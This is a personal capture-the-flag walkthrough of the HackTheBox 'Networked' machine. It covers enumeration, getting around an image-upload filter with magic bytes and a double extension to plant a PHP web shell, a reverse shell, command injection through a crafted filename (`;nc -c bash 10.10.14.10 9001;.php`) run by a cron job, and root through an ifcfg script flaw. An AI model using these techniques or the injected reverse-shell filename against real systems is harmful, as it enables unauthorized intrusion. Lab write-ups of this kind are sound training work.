### NMAP

```
sudo nmap -sC -sV -oA nmap-networked 
10.10.10.146
```

![[HackTheBox/Linux/attachments/Pasted image 20250507212439.png]]
- 22, 80

### Check out website 

Just see this message
![[HackTheBox/Linux/attachments/Pasted image 20250507212603.png]]
- not much info 
### Gobuster  - subdirectory enumeration

Appends php to everything in the wordlist because nmap told us php is running on the server
```
gobuster dir -u htpp://10.10.10.146 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```

Some hits
![[HackTheBox/Linux/attachments/Pasted image 20250507213022.png]]

Checking out the directories gobuster found

- `/uploads`: blank

- `/photos.php`: got some list of pics 
![[HackTheBox/Linux/attachments/Pasted image 20250507213159.png]]

- `/upload.php`: get a place to upload photos
![[HackTheBox/Linux/attachments/Pasted image 20250507213446.png]]
- Let's try uploading php script
Here's the php script 

![[HackTheBox/Linux/attachments/Pasted image 20250507213601.png]]

Upload this script and intercept with Burp and send to Repeater

![[HackTheBox/Linux/attachments/Pasted image 20250507213742.png]]

Response: invalid image file
![[HackTheBox/Linux/attachments/Pasted image 20250507213808.png]]

Revisiting GoBuster... and see the `/backup` directory 

![[HackTheBox/Linux/attachments/Pasted image 20250507213946.png]]
- there's a backup archive here

*Fun fact: downloading the file with wget keeps the server date and time while downloading the file via the browser gives the file the download date and time*

Use exiftool to view metadata of the file 

```
exiftool backup.tar
```

![[HackTheBox/Linux/attachments/Pasted image 20250507214307.png]]

Extract `backup.tar`

```
tar -xvf backup.tar
```

![[HackTheBox/Linux/attachments/Pasted image 20250507214422.png]]
- got 4 php files (like from a src dir)

The files all have a lot of info.. 

Quickly enumerate these files for user input functions with grep

```
grep -Ri '$_' *
```

![[HackTheBox/Linux/attachments/Pasted image 20250507214657.png]]
- notice $_FILES

Googling `php $_FILES` or php supergloblals

We're interested in these superglobals 

![[HackTheBox/Linux/attachments/Pasted image 20250507215120.png]]

Checking out upload.php and to see the `$_POST['submit']` function

![[HackTheBox/Linux/attachments/Pasted image 20250507215253.png]]
- first checks the file type and file size

Let's find the check_file_type func in lib.php
![[HackTheBox/Linux/attachments/Pasted image 20250507215415.png]]

![[HackTheBox/Linux/attachments/Pasted image 20250507215437.png]]
- mimetype and looking for any mime with "image/" in it

**mimetypes are generated by magic bytes**

*magic bytes*- first few byes of a file that tell you what it is 

![[HackTheBox/Linux/attachments/Pasted image 20250507215715.png]]

Just echoing in the magic bytes fools system into thinking it is the file type of the magic bytes 

![[HackTheBox/Linux/attachments/Pasted image 20250507215924.png]]

Reviewing the source code to determine all of the checks in place. Because still got invalid image type after adding magic bytes for a gif. 

Burp sending GIF8 ahead of php script, but getting "invalid image file"
![[HackTheBox/Linux/attachments/Pasted image 20250508190523.png]]

bad file type "invalid image file."
![[HackTheBox/Linux/attachments/Pasted image 20250508190403.png]]

bad name "invalid image file"
![[HackTheBox/Linux/attachments/Pasted image 20250508190444.png]]

We can only upload files with `.jpg, .png, .gif, .jpeg`

Trying to upload ippsec.php.gif with GIF8 prefix
![[HackTheBox/Linux/attachments/Pasted image 20250508190919.png]]

Success
![[HackTheBox/Linux/attachments/Pasted image 20250508190932.png]]

Then navigate to the php script in the browser

![[HackTheBox/Linux/attachments/Pasted image 20250508191112.png]]
- Now we have code execution 

whoami
![[HackTheBox/Linux/attachments/Pasted image 20250508191203.png]]

This is the shell
![[HackTheBox/Linux/attachments/Pasted image 20250508191243.png]]

### Get Reverse Shell

Send the page to Burp Repeater 
![[HackTheBox/Linux/attachments/Pasted image 20250508191458.png]]

![[HackTheBox/Linux/attachments/Pasted image 20250508191509.png]]

Here's the non-url encoded rev shell
![[HackTheBox/Linux/attachments/Pasted image 20250508191628.png]]

Highlight and hot ctrl+u to url encode it 

![[HackTheBox/Linux/attachments/Pasted image 20250508191702.png]]

Set up nc listener 
```
nc -lvnp 9001
```

Catch the shell 
![[HackTheBox/Linux/attachments/Pasted image 20250508191753.png]]

Get interactive shell. 

❗got initial access❗
as apache user :(
### Enumerate for lateral movement
Cannot view the guly user's files. How do we become guly

![[HackTheBox/Linux/attachments/Pasted image 20250508192126.png]]

We can see `crontab.guly` is executing `check_attack.php`

![[HackTheBox/Linux/attachments/Pasted image 20250508192231.png]]

Here is `check_attack.php`

We just have to figure out how to execute code through this script
![[HackTheBox/Linux/attachments/Pasted image 20250508192352.png]]
- first check to see if we can change `/var/www/html/lib.php`

This file is owned by root, so no
![[HackTheBox/Linux/attachments/Pasted image 20250508192508.png]]

### Priv esc to Guly by exploiting php Exec() function

Exec() in php is like system, which can execute anything 

We can control the $value here which is the filename because we can put files in the directory 
![[HackTheBox/Linux/attachments/Pasted image 20250508193857.png]]

Here is the malicious script so that the web server thinks this is malicious 
```
touch -- ';nc -c bash 10.10.14.10 9001;.php'
```
![[HackTheBox/Linux/attachments/Pasted image 20250508194100.png]]

File is here in the uploads
![[HackTheBox/Linux/attachments/Pasted image 20250508194311.png]]

Set up nc listener to catch rev shell 

We are ❗guly user ❗
![[HackTheBox/Linux/attachments/Pasted image 20250508194451.png]]

Get interactive shell again.

### Search for Priv Esc to Root

Run `sudo -l`

![[HackTheBox/Linux/attachments/Pasted image 20250508194648.png]]
- guly may be able to run `changename.sh` as root

Run `ls -la` on `changename.sh` but we can't write to it 
![[HackTheBox/Linux/attachments/Pasted image 20250508194800.png]]

Copying this file to host machine to make it easier to read.

```
base64 -w 0 /usr/local/sbin/changename.sh
```

Copy the terminal output 
![[HackTheBox/Linux/attachments/Pasted image 20250508194916.png]]

Then echo it into a file 
```
echo -n '<encoded text' | base64 -d changename.sh
```

Here is the `changename.sh` file
![[HackTheBox/Linux/attachments/Pasted image 20250508195101.png]]

Googling "linux ifcfg script rce"

[Exploit](https://seclists.org/fulldisclosure/2019/Apr/27) 

TL;DR of the exploit - put a space in one of the variables and when it reads the sysconfig file, it will execute it 

Here it is

![[HackTheBox/Linux/attachments/Pasted image 20250508195802.png]]

⭐ got root ⭐

because there is a space between twitter and bash, it literally executes bash 

![[HackTheBox/Linux/attachments/Pasted image 20250508195923.png]]
